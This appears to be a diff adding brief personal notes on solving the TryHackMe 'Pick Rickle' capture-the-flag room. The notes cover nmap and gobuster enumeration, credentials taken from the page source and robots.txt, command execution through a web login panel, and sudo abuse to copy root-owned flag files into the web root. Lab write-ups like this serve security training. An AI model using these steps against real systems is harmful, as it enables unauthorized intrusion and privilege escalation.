@@ -1,0 +1,25 @@
+go to https://tryhackme.com/
+choose 'Access' from right top corner
+select 'EU-Regular-1', and push 'Download My Configuration File'
+sudo open vpn ***.ovpn
+finish once 'Initialization Sequence Completed' showed up
+go to https://tryhackme.com/room/picklerick
+press 'Start Machine'
+sudo nmap IP // port scanning
+sudo nmap -A -p22,80 IP // -A= get OS version info , etc. -p=set port number.
+ctrl U // show page info of IP. get user name.
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://IP
+IP/robots.txt // get password
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://IP -x php // -x=search specific extension
+IP/login.php
+use user name and password from above.
+type 'ls', push Execute.
+IP/Sup3***.txt // get first ingridient
+'ls /home', push Execute.
+'ls /home/rick', push Execute.
+sudo -l //show does a user have privilege.
+sudo cp /home/rick/'second ingridients' test.txt // push Execute
+IP/test.txt // get second ingridient
+sudo ls -la /root
+sudo cp /root/3rd.txt test2.txt // push Execute
+IP/test2.txt // get third ingridient
